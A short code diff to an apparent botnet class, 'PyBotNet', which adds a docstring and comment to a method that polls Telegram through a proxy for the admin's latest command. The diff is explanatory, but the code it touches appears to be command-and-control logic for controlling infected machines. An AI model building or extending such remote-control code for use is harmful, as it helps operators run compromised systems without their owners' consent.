@@ -51,9 +51,12 @@ class PyBotNet:
         return util.post_data(self.api_url, self.logger)
 
     def get_last_command_by_third_party_proxy(self):
+        '''return last message from admin or False'''
+
         messages_list = (util.get_update_by_third_party_proxy(
             self.TELEGRAM_TOKEN, self.logger))
 
+        # if message list not False > extract last message from admin > if last admin message not False return
         if messages_list:
             last_message = util.extract_last_admin_command(
                 messages_list, self.ADMIN_CHAT_ID, self.logger)
